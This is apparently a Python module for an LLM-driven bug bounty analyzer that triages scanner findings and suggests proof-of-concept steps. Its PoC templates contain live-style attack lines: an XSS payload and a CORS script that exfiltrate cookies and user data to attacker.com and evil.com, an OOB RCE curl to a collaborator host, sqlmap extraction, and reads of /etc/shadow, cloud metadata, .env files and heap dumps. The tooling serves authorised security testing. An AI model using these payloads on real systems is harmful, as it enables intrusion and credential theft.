"""Analyzer agent: triage findings, remove FPs, suggest PoC, find chains."""

from __future__ import annotations

import json
import logging
from typing import Any

from bugbounty.agents.base import AgentTool, BaseAgent
from bugbounty.core.llm import LLMProvider
from bugbounty.db.models import AnalysisResult, Finding, LiveHost

logger = logging.getLogger(__name__)

_SYSTEM_PROMPT = """You are an expert security analyst specialising in vulnerability triage and
bug bounty reporting. You have deep expertise across web, API, network, and cloud security.

Your responsibilities:
1. Analyse security findings from automated scanners (nuclei, dalfox, ffuf).
2. Distinguish true positives from false positives with clear reasoning.
3. Assess the actual exploitability and real-world impact of each vulnerability.
4. Suggest detailed, step-by-step proof-of-concept (PoC) reproduction steps.
5. Identify vulnerability chains: combinations of lower-severity findings that together
   create a high-severity impact.
6. Generate an executive summary suitable for a security report.

Be concise but thorough.  Use the tools to systematically process findings.
Return your final analysis as structured JSON."""


class AnalyzerAgent(BaseAgent):
    """AI agent that triages findings and identifies vulnerability chains.

    Specialised for SSRF and XSS: applies stricter FP logic for these
    vulnerability classes and provides context-aware PoC guidance.
    """

    def __init__(self, provider: LLMProvider) -> None:
        super().__init__(provider)

    def get_tools(self) -> list[AgentTool]:
        return [
            {
                "name": "assess_finding",
                "description": (
                    "Assess whether a security finding is a true positive or false positive. "
                    "Returns severity assessment, exploitability rating, FP likelihood, and reasoning."
                ),
                "input_schema": {
                    "type": "object",
                    "properties": {
                        "finding_id": {"type": "string", "description": "Finding UUID"},
                        "template_id": {"type": "string"},
                        "name": {"type": "string"},
                        "severity": {"type": "string"},
                        "host": {"type": "string"},
                        "matched_at": {"type": "string"},
                        "description": {"type": "string"},
                        "tags": {
                            "type": "array",
                            "items": {"type": "string"},
                        },
                        "cvss_score": {"type": "number"},
                    },
                    "required": ["finding_id", "name", "severity", "host", "description"],
                },
            },
            {
                "name": "suggest_poc",
                "description": (
                    "Given a vulnerability type and target, return detailed step-by-step "
                    "proof-of-concept reproduction steps."
                ),
                "input_schema": {
                    "type": "object",
                    "properties": {
                        "vulnerability_type": {
                            "type": "string",
                            "description": "e.g. 'XSS', 'SQLi', 'SSRF', 'Open Redirect'",
                        },
                        "host": {"type": "string"},
                        "matched_at": {"type": "string"},
                        "description": {"type": "string"},
                        "tags": {
                            "type": "array",
                            "items": {"type": "string"},
                        },
                    },
                    "required": ["vulnerability_type", "host"],
                },
            },
            {
                "name": "check_vuln_chain",
                "description": (
                    "Given a list of confirmed findings on a target, identify whether any "
                    "findings can be chained together for a higher-impact attack."
                ),
                "input_schema": {
                    "type": "object",
                    "properties": {
                        "findings": {
                            "type": "array",
                            "description": "List of finding dicts (name, severity, host, matched_at)",
                            "items": {"type": "object"},
                        },
                    },
                    "required": ["findings"],
                },
            },
        ]

    async def process_tool_call(self, tool_name: str, tool_input: dict) -> str:
        if tool_name == "assess_finding":
            return await self._assess_finding(tool_input)
        if tool_name == "suggest_poc":
            return await self._suggest_poc(tool_input)
        if tool_name == "check_vuln_chain":
            return await self._check_chain(tool_input)
        return json.dumps({"error": f"Unknown tool: {tool_name}"})

    # ------------------------------------------------------------------
    # Tool implementations
    # ------------------------------------------------------------------

    async def _assess_finding(self, inp: dict) -> str:
        name = inp.get("name", "")
        severity = inp.get("severity", "info")
        host = inp.get("host", "")
        description = inp.get("description", "")
        tags = inp.get("tags", [])
        template_id = inp.get("template_id", "")
        name_lower = name.lower()
        template_lower = template_id.lower()
        tags_lower = [t.lower() for t in tags]

        fp_indicators = 0
        fp_reasons: list[str] = []
        confidence_boost = 0
        confidence_reasons: list[str] = []

        # ---------------------------------------------------------------
        # SSRF-specific FP logic
        # ---------------------------------------------------------------
        is_ssrf = (
            "ssrf" in name_lower
            or "ssrf" in template_lower
            or "ssrf" in tags_lower
            or any(p in name_lower for p in ["server-side request", "out-of-band", "oob"])
        )
        if is_ssrf:
            # OOB-confirmed SSRF is almost always a true positive
            if "oob_interaction" in (inp.get("evidence_type", "") or ""):
                confidence_boost += 3
                confidence_reasons.append("OOB DNS/HTTP callback received – definitively confirmed")
            elif "confirmed" == inp.get("confidence", ""):
                confidence_boost += 2
                confidence_reasons.append("Scanner marked as confirmed (OOB or response-based)")
            elif inp.get("evidence_type") == "error_message":
                # Error-based SSRF is medium confidence – needs manual verification
                fp_indicators += 1
                fp_reasons.append(
                    "Error-based SSRF detection: verify the error message is "
                    "caused by the injected payload and not a pre-existing condition"
                )
            elif inp.get("evidence_type") == "internal_ip_leak":
                confidence_boost += 2
                confidence_reasons.append("Internal IP address found in response body")

        # ---------------------------------------------------------------
        # XSS-specific FP logic
        # ---------------------------------------------------------------
        is_xss = (
            "xss" in name_lower
            or "xss" in template_lower
            or "xss" in tags_lower
            or "cross-site scripting" in name_lower
        )
        if is_xss:
            if inp.get("xss_type") == "dalfox" and "confirmed" == inp.get("confidence", ""):
                # dalfox has excellent FP filtering – high confidence
                confidence_boost += 2
                confidence_reasons.append("Dalfox confirmed – tool has built-in FP filtering")
            elif inp.get("xss_type") == "reflected" and inp.get("context"):
                # Reflection-based with confirmed unescaped payload in response
                confidence_boost += 2
                confidence_reasons.append(
                    f"Reflected payload confirmed unescaped in {inp.get('context')} context"
                )
            # Nuclei XSS templates without payload confirmation are medium confidence
            elif "nuclei" in (inp.get("source", "") or ""):
                fp_indicators += 1
                fp_reasons.append(
                    "Nuclei XSS template without payload confirmation – "
                    "manually verify the payload executes unescaped"
                )

        # ---------------------------------------------------------------
        # CORS-specific FP logic
        # ---------------------------------------------------------------
        is_cors = "cors" in name_lower or "cross-origin" in name_lower
        if is_cors:
            if "critical" in severity or "credential" in description.lower():
                # Reflected origin with credentials → account takeover risk
                confidence_boost += 3
                confidence_reasons.append(
                    "CORS: reflected/null origin with credentials:true confirmed – "
                    "enables cross-origin account takeover"
                )
            elif "wildcard" in description.lower():
                # Wildcard CORS without credentials → often intentional for public APIs
                fp_indicators += 1
                fp_reasons.append(
                    "Wildcard CORS: frequently intentional for public APIs. "
                    "Credentials cannot be sent with wildcard ACAO per spec."
                )
            else:
                confidence_boost += 1
                confidence_reasons.append(
                    "CORS misconfiguration confirmed by scanner with content validation"
                )

        # ---------------------------------------------------------------
        # Open redirect FP logic
        # ---------------------------------------------------------------
        is_redirect = "redirect" in name_lower or "open redirect" in name_lower
        if is_redirect:
            if inp.get("confidence") == "confirmed":
                confidence_boost += 3
                confidence_reasons.append(
                    "Redirect confirmed: scanner verified final URL host matches injected domain"
                )
            elif inp.get("confidence") == "high":
                confidence_boost += 2
                confidence_reasons.append(
                    "Redirect high confidence: partial host match in final URL"
                )
            chain = inp.get("chaining_potential", "none")
            if chain in ("oauth", "ssrf"):
                confidence_boost += 1
                confidence_reasons.append(
                    f"Higher impact: redirect is in an {chain.upper()} flow, "
                    "enabling token theft or server-side request forgery"
                )

        # ---------------------------------------------------------------
        # Subdomain takeover FP logic
        # ---------------------------------------------------------------
        is_takeover = "takeover" in name_lower
        if is_takeover:
            confidence_boost += 3
            confidence_reasons.append(
                "Subdomain takeover: confirmed by CNAME fingerprint AND HTTP body content match. "
                "These are almost never false positives."
            )

        # ---------------------------------------------------------------
        # Exposure / disclosure FP logic
        # ---------------------------------------------------------------
        is_exposure = any(
            kw in name_lower
            for kw in [
                "exposed", "disclosure", "git", "env file", "actuator",
                "graphql introspection", "debug", "backup", "admin panel",
                "hardcoded secret",
            ]
        )
        if is_exposure:
            if inp.get("confidence") == "confirmed":
                confidence_boost += 2
                confidence_reasons.append(
                    "Exposure confirmed by content validation (body content matched expected pattern)"
                )
            # Generic 200 without content validation markers is a likely FP
            evidence = inp.get("evidence") or ""
            if "validation" not in evidence and "confirmed" not in evidence:
                fp_indicators += 1
                fp_reasons.append(
                    "Exposure finding lacks content validation evidence – "
                    "may be a generic 200 response. Manually verify content."
                )

        # ---------------------------------------------------------------
        # Generic high-FP template patterns
        # ---------------------------------------------------------------
        info_templates = {
            "tech-detect", "ssl-dns-names", "waf-detect",
            "favicon-detection", "server-detection", "options-method",
            "http-missing-security-headers",
        }
        if any(t in template_lower for t in info_templates):
            fp_indicators += 2
            fp_reasons.append("Informational detection template – not actionable as a vuln")

        if "generic" in tags_lower or "detect" in tags_lower:
            fp_indicators += 1
            fp_reasons.append("Detection/generic tag – informational only")

        # ---------------------------------------------------------------
        # Determine overall FP likelihood
        # ---------------------------------------------------------------
        net_score = confidence_boost - fp_indicators
        if net_score >= 2:
            fp_likelihood = "low"
        elif fp_indicators >= 3 and confidence_boost == 0:
            fp_likelihood = "high"
        elif fp_indicators >= 1 and confidence_boost == 0:
            fp_likelihood = "medium"
        else:
            fp_likelihood = "low"

        # Impact assessment
        impact_map = {
            "critical": "Full system compromise, data breach, or complete service takeover",
            "high": "Significant data exposure, authentication bypass, or privilege escalation",
            "medium": "Partial data exposure, limited privilege escalation, or service degradation",
            "low": "Minimal direct impact; useful for reconnaissance or chaining",
            "info": "No direct security impact; useful for mapping attack surface",
        }
        impact = impact_map.get(severity, "Unknown impact")

        # Special high-impact SSRF case
        if is_ssrf and fp_likelihood == "low":
            impact = (
                "High potential: internal service access, cloud metadata credential theft "
                "(AWS IMDS), pivoting to internal network, or reading sensitive files"
            )

        return json.dumps(
            {
                "finding_id": inp.get("finding_id", ""),
                "assessment": "false_positive" if fp_likelihood == "high" else "true_positive",
                "fp_likelihood": fp_likelihood,
                "fp_reasons": fp_reasons,
                "confidence_reasons": confidence_reasons,
                "exploitability": (
                    "confirmed" if confidence_boost >= 2
                    else "likely" if confidence_boost >= 1
                    else "needs manual verification"
                ),
                "impact": impact,
                "vulnerability_class": (
                    "SSRF" if is_ssrf
                    else "XSS" if is_xss
                    else "other"
                ),
                "recommended_action": (
                    "Discard – likely false positive"
                    if fp_likelihood == "high"
                    else "Manually verify before reporting"
                    if fp_likelihood == "medium"
                    else "Report to programme – high confidence finding"
                ),
            }
        )

    async def _suggest_poc(self, inp: dict) -> str:
        vuln_type = inp.get("vulnerability_type", "").upper()
        host = inp.get("host", "example.com")
        matched_at = inp.get("matched_at", host)
        description = inp.get("description", "")

        poc_templates: dict[str, list[str]] = {
            "XSS": [
                f"1. Open a browser and navigate to: {matched_at}",
                "2. In the vulnerable input field, enter the payload: <script>alert(document.domain)</script>",
                "3. Submit the form or trigger the request.",
                "4. Observe the alert dialog confirming script execution in the context of the target origin.",
                "5. For a stored XSS, refresh the page and verify persistence.",
                "6. To demonstrate impact, modify the payload to exfiltrate cookies: "
                "<script>fetch('https://attacker.com/?c='+document.cookie)</script>",
            ],
            "SQLI": [
                f"1. Navigate to: {matched_at}",
                "2. Identify the vulnerable parameter (look for numeric IDs, search fields).",
                "3. Test with a single quote: ' — if an error occurs, SQL injection is likely.",
                "4. Confirm with: ' OR '1'='1",
                "5. Use sqlmap to enumerate databases: sqlmap -u '"
                + matched_at
                + "' --dbs --batch",
                "6. Extract sensitive data: sqlmap -u '"
                + matched_at
                + "' -D <db_name> --tables --batch",
            ],
            "SSRF": [
                f"1. Navigate to: {matched_at}",
                "2. Identify parameters that accept URLs (url=, path=, redirect=, src=, etc.).",
                "3. Start a listener: python3 -m http.server 8080 (or use Burp Collaborator).",
                "4. Submit the target URL with your listener address as the value.",
                "5. Confirm the target server makes an outbound request to your listener.",
                "6. Attempt to access internal services: http://169.254.169.254/latest/meta-data/ (AWS)",
                "7. Escalate to read internal files: file:///etc/passwd",
            ],
            "OPEN REDIRECT": [
                f"1. Navigate to: {matched_at}",
                "2. Identify the redirect parameter (next=, redirect=, url=, returnTo=, etc.).",
                "3. Replace the parameter value with an external URL: https://evil.com",
                "4. Observe that the application redirects to the external URL without validation.",
                "5. Craft a phishing URL combining the trusted domain with the redirect.",
                f"   Phishing demo: curl -Lsk '{matched_at}' | grep -i redirect",
                "6. OAuth chain demo: replace the redirect_uri in an OAuth authorization request "
                "with the open redirect URL pointing to your server to steal the code/token.",
            ],
            "CORS": [
                f"1. Send a cross-origin request to the vulnerable endpoint: {matched_at}",
                "2. JavaScript PoC (run from evil.com origin):",
                "   fetch('https://" + host + "/api/user', {",
                "     credentials: 'include',",
                "     headers: { 'Origin': 'https://evil.com' }",
                "   }).then(r => r.json()).then(data => {",
                "     fetch('https://evil.com/log?d=' + JSON.stringify(data));",
                "   });",
                "3. Confirm the Access-Control-Allow-Origin header reflects https://evil.com.",
                "4. Confirm Access-Control-Allow-Credentials: true in response headers.",
                "5. Host the JavaScript above on an attacker-controlled page and trick a victim into visiting.",
                "6. Collect the exfiltrated authenticated response data from your server logs.",
            ],
            "SUBDOMAIN TAKEOVER": [
                f"1. Confirm the dangling CNAME: dig CNAME {host}",
                "2. Verify the CNAME target points to an unclaimed service (e.g. GitHub Pages, Heroku).",
                "3. To claim the subdomain on GitHub Pages:",
                "   a. Create a GitHub repository.",
                "   b. Go to Settings → Pages → Custom domain.",
                "   c. Enter the target subdomain as the custom domain.",
                "   d. GitHub will serve content from your repository on that subdomain.",
                "4. Once claimed, you can serve arbitrary content under the target's domain.",
                "5. Use cases: phishing, cookie theft (if cookies are scoped to parent domain), CSP bypass.",
                "6. Report immediately — do NOT claim the subdomain in production.",
            ],
            "GIT EXPOSED": [
                f"1. Confirm the exposed repository: curl -sk {matched_at}/.git/config",
                "2. Dump the full repository using git-dumper:",
                f"   python3 git_dumper.py {matched_at}/.git ./output_dir",
                "3. Alternatively: git clone {matched_at} (if directory listing enabled)",
                "4. Examine the downloaded repository for secrets, credentials, and source code.",
                "5. Check git log for removed secrets: git log -p | grep -i password",
                "6. Report: source code exposure, credential leak, or internal path disclosure.",
            ],
            "ENV EXPOSED": [
                f"1. Confirm the exposed file: curl -sk {matched_at}/.env",
                "2. Review the file contents for database credentials, API keys, and secrets.",
                "3. Attempt to use any extracted credentials to demonstrate impact.",
                "4. Check for adjacent backup files: .env.bak, .env.production, .env.local",
                "5. Report all extracted sensitive values (truncated for the report).",
            ],
            "ACTUATOR EXPOSED": [
                f"1. Confirm the endpoint: curl -sk {matched_at}/actuator/env",
                "2. Check for sensitive property values (database passwords, API keys):",
                f"   curl -sk {matched_at}/actuator/env | python3 -m json.tool | grep -i pass",
                f"3. Download heap dump (may contain in-memory secrets):",
                f"   curl -sk {matched_at}/actuator/heapdump -o heapdump.hprof",
                "4. Analyse heap dump: strings heapdump.hprof | grep -i password",
                "5. Check thread dump for running queries/credentials:",
                f"   curl -sk {matched_at}/actuator/threaddump | python3 -m json.tool",
            ],
            "GRAPHQL": [
                f"1. Send an introspection query to: {matched_at}",
                "   curl -sk -X POST -H 'Content-Type: application/json' \\",
                f"     -d '{{\"query\":\"{{__schema{{types{{name}}}}}}\"}}' \\",
                f"     {matched_at}",
                "2. Parse the returned schema to identify sensitive types and fields.",
                "3. Enumerate all queries and mutations: look for admin, delete, update operations.",
                "4. Test for IDOR via GraphQL IDs, missing auth on sensitive queries.",
                "5. Use graphql-cop for automated security testing: graphql-cop -t " + matched_at,
            ],
            "LFI": [
                f"1. Navigate to: {matched_at}",
                "2. Identify the vulnerable parameter (file=, page=, include=, etc.).",
                "3. Test path traversal: ../../../../etc/passwd",
                "4. Try URL-encoded variants: ..%2F..%2F..%2Fetc%2Fpasswd",
                "5. Read sensitive files: /etc/passwd, /etc/shadow, /proc/self/environ",
                "6. If PHP, attempt log poisoning via User-Agent to achieve RCE.",
            ],
            "RCE": [
                f"1. Navigate to: {matched_at}",
                "2. Identify the injection point from the template description.",
                "3. Test with a safe command: whoami or id",
                "4. Use time-based detection if blind: sleep 5",
                "5. Capture output via OOB: curl https://your-collaborator.com/$(id|base64)",
                "6. Demonstrate RCE impact responsibly — do NOT execute destructive commands.",
            ],
        }

        # Find best match — also check description for compound names
        steps: list[str] = []
        description_upper = description.upper()
        for key, template_steps in poc_templates.items():
            if key in vuln_type or vuln_type in key:
                steps = template_steps
                break
            # Fallback: match via description keywords for compound template names
            if not steps and key in description_upper:
                steps = template_steps

        if not steps:
            steps = [
                f"1. Navigate to the affected endpoint: {matched_at}",
                "2. Review the tool output and description to identify the injection point.",
                "3. Manually verify the finding by reproducing the conditions described.",
                "4. Document the request/response cycle using Burp Suite or browser DevTools.",
                "5. Assess the actual impact in the context of the application.",
                f"Technical details: {description[:300]}" if description else "",
            ]

        return json.dumps(
            {
                "vulnerability_type": vuln_type,
                "host": host,
                "poc_steps": [s for s in steps if s],
                "tools_required": ["Browser", "Burp Suite", "curl"],
                "estimated_difficulty": (
                    "Low" if vuln_type in ("XSS", "OPEN REDIRECT") else "Medium"
                ),
            }
        )

    async def _check_chain(self, inp: dict) -> str:
        findings: list[dict] = inp.get("findings", [])
        chains: list[dict] = []

        if len(findings) < 2:
            return json.dumps({"chains": [], "analysis": "Insufficient findings to chain."})

        # Group findings by host
        by_host: dict[str, list[dict]] = {}
        for f in findings:
            host = f.get("host", "")
            by_host.setdefault(host, []).append(f)

        for host, host_findings in by_host.items():
            names_lower = [f.get("name", "").lower() for f in host_findings]
            severities = [f.get("severity", "info") for f in host_findings]

            # XSS + CSRF bypass → Account Takeover
            if any("xss" in n for n in names_lower) and any("csrf" in n for n in names_lower):
                chains.append(
                    {
                        "chain_id": f"chain-xss-csrf-{host}",
                        "host": host,
                        "components": ["XSS", "CSRF Token Bypass"],
                        "chained_severity": "high",
                        "impact": "Account takeover via XSS-triggered CSRF",
                        "description": (
                            "An XSS vulnerability combined with a CSRF token bypass allows an "
                            "attacker to perform authenticated actions on behalf of victims, "
                            "potentially achieving full account takeover."
                        ),
                    }
                )

            # Open Redirect + OAuth → Token Theft
            if any("open redirect" in n or "redirect" in n for n in names_lower):
                if any("oauth" in n or "sso" in n or "token" in n for n in names_lower):
                    chains.append(
                        {
                            "chain_id": f"chain-redirect-oauth-{host}",
                            "host": host,
                            "components": ["Open Redirect", "OAuth/SSO"],
                            "chained_severity": "high",
                            "impact": "OAuth token theft via open redirect",
                            "description": (
                                "An open redirect in the OAuth flow allows an attacker to "
                                "redirect the authorization code or token to an attacker-controlled "
                                "domain, resulting in account takeover."
                            ),
                        }
                    )

            # SSRF + Internal services → Escalation
            if any("ssrf" in n for n in names_lower) and any(
                "metadata" in n or "aws" in n or "imds" in n for n in names_lower
            ):
                chains.append(
                    {
                        "chain_id": f"chain-ssrf-cloud-{host}",
                        "host": host,
                        "components": ["SSRF", "Cloud Metadata Access"],
                        "chained_severity": "critical",
                        "impact": "Cloud credential theft via SSRF to metadata service",
                        "description": (
                            "SSRF reaching the cloud instance metadata service (IMDS) can expose "
                            "IAM credentials, enabling full cloud account compromise."
                        ),
                    }
                )

            # Information disclosure + injection → Escalation
            low_severities = [f for f in host_findings if f.get("severity") in ("low", "info")]
            high_severities = [f for f in host_findings if f.get("severity") in ("high", "critical")]
            if low_severities and high_severities:
                chains.append(
                    {
                        "chain_id": f"chain-info-injection-{host}",
                        "host": host,
                        "components": [
                            f.get("name", "") for f in low_severities[:2] + high_severities[:1]
                        ],
                        "chained_severity": "high",
                        "impact": "Information disclosure aids exploitation of injection vulnerabilities",
                        "description": (
                            "Leaked configuration data, stack traces, or internal paths make "
                            "injection vulnerabilities significantly easier to exploit."
                        ),
                    }
                )

        return json.dumps(
            {
                "chains": chains,
                "analysis": (
                    f"Identified {len(chains)} potential vulnerability chain(s) across "
                    f"{len(by_host)} host(s)."
                ),
            }
        )

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    async def analyze_findings(
        self,
        findings: list[Finding],
        live_hosts: list[LiveHost],
    ) -> AnalysisResult:
        """Triage all findings and return a structured AnalysisResult.

        Args:
            findings:   Raw findings from automated scanners.
            live_hosts: Live hosts discovered during recon (for context).

        Returns:
            Populated AnalysisResult with true/false positives and chains.
        """
        if not findings:
            return AnalysisResult(
                executive_summary="No security findings were discovered during this scan.",
            )

        # Build context for the agent
        findings_summary = "\n".join(
            f"- [{f.severity.upper()}] {f.name} @ {f.host} (ID: {f.id})"
            for f in findings
        )
        hosts_summary = "\n".join(
            f"  {h.url} [{h.status_code}] Tech: {', '.join(h.technologies[:3])}"
            for h in live_hosts[:20]
        )

        findings_json = [
            {
                "finding_id": f.id,
                "template_id": f.template_id,
                "name": f.name,
                "severity": f.severity,
                "host": f.host,
                "matched_at": f.matched_at,
                "description": f.description,
                "tags": f.tags,
                "cvss_score": f.cvss_score,
            }
            for f in findings
        ]

        user_message = (
            f"Please analyse the following {len(findings)} security findings and triage them.\n\n"
            f"FINDINGS:\n{findings_summary}\n\n"
            f"LIVE HOSTS CONTEXT (first 20):\n{hosts_summary}\n\n"
            f"Full findings data:\n{json.dumps(findings_json, indent=2)}\n\n"
            "Instructions:\n"
            "1. Use the assess_finding tool for each finding to determine if it's a true positive.\n"
            "2. Use suggest_poc for each confirmed true positive.\n"
            "3. Use check_vuln_chain to identify vulnerability chains.\n"
            "4. Provide an executive summary.\n"
            "5. Return a final JSON with keys: "
            "true_positive_ids, false_positive_ids, high_impact_chains, executive_summary."
        )

        final_text = await self.run_agentic_loop(
            system_prompt=_SYSTEM_PROMPT,
            user_message=user_message,
            max_iterations=min(len(findings) * 3 + 5, 30),
        )

        # Parse the agent's output
        true_positive_ids: set[str] = set()
        false_positive_ids: set[str] = set()
        chains: list[dict] = []
        exec_summary = ""

        try:
            json_start = final_text.find("{")
            json_end = final_text.rfind("}") + 1
            if json_start != -1:
                result_dict = json.loads(final_text[json_start:json_end])
                true_positive_ids = set(result_dict.get("true_positive_ids", []))
                false_positive_ids = set(result_dict.get("false_positive_ids", []))
                chains = result_dict.get("high_impact_chains", [])
                exec_summary = result_dict.get("executive_summary", "")
        except (json.JSONDecodeError, ValueError):
            logger.warning("Could not parse analyzer JSON output – classifying all as true positives")
            true_positive_ids = {f.id for f in findings}
            exec_summary = final_text[:1000] if final_text else "Analysis completed."

        # If the agent didn't return explicit classifications, default to true positive
        if not true_positive_ids and not false_positive_ids:
            true_positive_ids = {f.id for f in findings}

        # Build result
        true_pos: list[Finding] = []
        false_pos: list[Finding] = []

        for f in findings:
            if f.id in false_positive_ids:
                f.is_false_positive = True
                false_pos.append(f)
            else:
                true_pos.append(f)

        # Count by severity among true positives
        counts: dict[str, int] = {
            "critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0
        }
        for f in true_pos:
            counts[f.severity] = counts.get(f.severity, 0) + 1

        if not exec_summary:
            exec_summary = (
                f"Automated scan identified {len(findings)} findings. "
                f"After triage: {len(true_pos)} true positives "
                f"({counts['critical']} critical, {counts['high']} high, "
                f"{counts['medium']} medium) and {len(false_pos)} false positives. "
                f"{len(chains)} vulnerability chain(s) identified."
            )

        return AnalysisResult(
            true_positives=true_pos,
            false_positives=false_pos,
            high_impact_chains=chains,
            executive_summary=exec_summary,
            total_critical=counts["critical"],
            total_high=counts["high"],
            total_medium=counts["medium"],
            total_low=counts["low"],
            total_info=counts.get("info", 0),
        )
